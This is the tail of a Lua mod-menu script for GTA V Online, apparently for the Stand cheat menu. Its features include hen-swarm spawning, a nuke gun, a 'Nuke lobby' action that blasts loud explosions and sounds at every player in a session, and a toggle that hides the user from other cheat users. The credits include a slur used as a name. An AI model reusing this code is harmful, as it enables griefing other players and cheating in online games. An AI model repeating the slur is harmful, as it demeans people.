local army = menu.list(atacks, "Chickeny attack", {}, "Saca gallinas... MUCHAS GALLINAS!!")
menu.click_slider(army, "Spawn H attack", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local ped = util.joaat("a_c_hen")
    ryze.request_model(ped)
     for i = 1, val do
        hen_army[i] = entities.create_ped(28, ped, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(hen_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(hen_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(hen_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(hen_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "Clean H", {}, "", function()
    for i, ped in ipairs(hen_army) do
        entities.delete_by_handle(hen_army[i])
    end
end)

armanuc = menu.list(fun, "Nuclear options", {}, "")

menu.action(armanuc, "Nuke lobby", {}, "Initiates the nuke for the lobby.", function()
    util.toast("Dropping the nuke.")
    ryze.play_all("Air_Defences_Activated", "DLC_sum20_Business_Battle_AC_Sounds", 3000)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 1000)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 1000)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 500)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 500)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.play_all("5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET", 125)
    ryze.explode_all(EARRAPE_FLASH, 0)
    ryze.explode_all(EARRAPE_FLASH, 150)
    ryze.explode_all(EARRAPE_BED, 0)
    ryze.explode_all(EARRAPE_NONE, 0)
end)

local nuke_gun_toggle = menu.toggle(armanuc, "Nuclear weapon", {"JSnukeGun"}, "This rpg basically shoots nukes.", function(toggle)
    nuke_running = toggle	
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, "off") end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not remove_projectiles then 
                        remove_projectiles = true 
                        ryze.disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat("w_arena_airmissile_01a")
                        STREAMING.REQUEST_MODEL(hash)
                        ryze.yieldModelLoad(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)   
                        local dir, pos = direction()
                        local bomb = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, true, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

local nuke_height = 40
menu.slider(armanuc, "Nuke's height", {"JSnukeHeight"}, "Drops a nuke on your waypoint.", 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)

function executeNuke(pos)	
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)	
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

--------------------------------------------------------------------------------------------------------------------------------
-- Misc

menu.hyperlink(misc, "Join Discord!", "https://discord.gg/BNbSHhunPv")

menu.toggle(misc, "Close automatically", {}, "It will close the scrit automatically upon entering gta \nIf you turn it on it will take less loading time, just saying.", function(on)
    if on then
        if not SCRIPT_MANUAL_START then
            util.stop_script()
        end
    end
end)

menu.toggle(misc, "Modo Screenshot", {}, "So you can take photos ahwhahaah", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "Stand Identifier", {}, "It will make you invisible for other Stand users, but you can't detect them either.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)

local credits = menu.list(misc, "Credits", {}, "")
menu.hyperlink(credits, "My Github", "https://github.com/xxpichoclesxx")
local devcred = menu.list(credits, "Dev Credits", {}, "")
local othercred = menu.list(credits, "Other Credits", {}, "")
menu.action(devcred, "Aaron", {}, "Thanks for helping me with my first steps in the stand lua api", function()
end)
menu.action(devcred, "gLance", {}, "He gave me a lot of help with Gta V natives.", function()
end)
menu.action(devcred, "LanceScriptTEOF", {}, "He helped me learn and understand Gta V natives", function()
end)
menu.action(devcred, "Cxbr", {}, "Thx for friendly features <3", function()
end)
menu.action(devcred, "Sapphire", {}, "Who helped me with almost every single feature and being patient because of my dumb brain <3", function()
end)
menu.action(devcred, "JinxScript/Prisuhm", {}, "Thx to him for shitting talking about me and saying 'Skidding is not the way you learn' \nCredits to jinxscript community for making jinxscript possible and also some of this functions.", function()
end)
menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "This will never be posible without them <3", function()
end)
menu.action(othercred, "Wigger", {}, "He bringed some ideas to the script and some functions, thx", function()
end)
menu.action(othercred, "Kyuu", {}, "He fully translated the script to English. Special Thx <3", function()
end)
menu.action(othercred, "HADES", {}, "He fully translated the script to Korean", function()
end)
menu.action(othercred, "You <3", {}, "The people who are still here, thx to everyone <3", function()
end)

util.on_stop(function ()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    util.toast("Bye\nHope you like it :3")
    util.toast("Cleaning...")
end)

players.dispatch_on_join()
